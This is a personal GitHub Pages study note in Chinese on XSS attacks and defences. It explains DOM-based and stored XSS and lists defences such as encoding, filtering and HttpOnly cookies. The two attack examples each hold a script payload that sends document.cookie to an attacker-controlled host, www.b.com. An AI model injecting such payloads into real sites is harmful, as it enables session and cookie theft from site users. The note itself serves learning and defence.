<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="UTF-8">
    <title>Rachelmilu.GitHub.io by RachelMilu</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="stylesheets/normalize.css" media="screen">
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
    <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
  </head>
  <body>
    <section class="page-header">
      <h1 class="project-name">Rachelmilu.GitHub.io</h1>
      <h2 class="project-tagline">XSS攻击</h2>
    </section>

    <section class="main-content">
      <p>
      拉钩上看到sf招聘要求有一条：知道xss攻击，特地搜索了一下xss的攻防，总结如下：
      </p>
      <h3 class="project-tagline">XSS攻击</h3>
      <p>
       所有可输入的地方 没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。
      </p>
      <p>
      XSS漏洞可以分为DOM Based XSS漏洞，另一种是Stored XSS漏洞。
      </p>

      <ol>
        <li>
        <span>DOM Based XSS属于非持久型xss攻击又叫是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。</span>
        <p>
         假设某一使用cookie的网站http://www.a.com上有一个链接，链接是由通过某一变量content与字符串组装起来的，在用户已经登陆的情况下，只要在浏览器的网址栏中输入
        </p>
       <pre>
          <code>
          http://www.a.com?content=《script》window@open(“www.b.com?param=”+document@cookie)《/script》， 
        </code>
       </pre>
        <p>
        cookie中存有的登录密码就可能被盗取。
        </p>
        </li>
        
         <li>
        <span>Stored XSS属于持久型xss攻击，是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，该攻击特点受害者是很多人。</span>
        <p>
         假设一个网站http://www.a.com可以输入内容并存储到服务器，我在input框中输入恶意代码
        </p>
        <pre>
          <code>
          《script》window@open(“www.b.com?param=”+document@cookie)《/script》
          </code>
        </pre>
        <p>
        并成功地保存到服务器之后，一旦有人访问了我发布的内容，该代码就会执行，用户的cookie数据就会被发送到我自己的服务器www.b.com， 对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码。
        </p>
        </li>
      </ol>
      <h3 class="project-tagline">XSS防御</h3>
      <p>必须对用户的输入进行校验。</p>
      
       <ol>
        <li>
        输入过滤，html encode 将特殊字符转码，如<code><</code>要转换成<code>"&lt;"</code>， 务必保证用户输入的东西是文本而不是一段可执行的代码。
        </li>
        <li>
        限制输入
        </li>
        <li>
        输出过滤，这个帖子讲的很全：<a href="http://blog.jobbole.com/47372/" >http://blog.jobbole.com/47372/</a>
        </li>
        <li>
        HttpOnly防止劫取Cookie
       <pre>
          <code>
            header("Set-Cookie: cookie2=test2;httponly",false);
          </code>
       </pre>
        </li>
      </ol>
      <p>
      最后感谢各位前辈分享，的参考原文链接如下：
       <ol>
              <li>
              <a href="http://blog.csdn.net/ghsau/article/details/17027893">http://blog.csdn.net/ghsau/article/details/17027893</a>
              </li>
              <li>
              <a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html">http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html</a>
              </li>
              <li>
              <a href="http://blog.jobbole.com/47372/">http://blog.jobbole.com/47372/</a>
              </li>
        </ol>
      </p>
      <footer class="site-footer">
        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the <a href="https://github.com/jasonlong/cayman-theme">Cayman theme</a> by <a href="https://twitter.com/jasonlong">Jason Long</a>.</span>
      </footer>
    </section>
  </body>
</html>

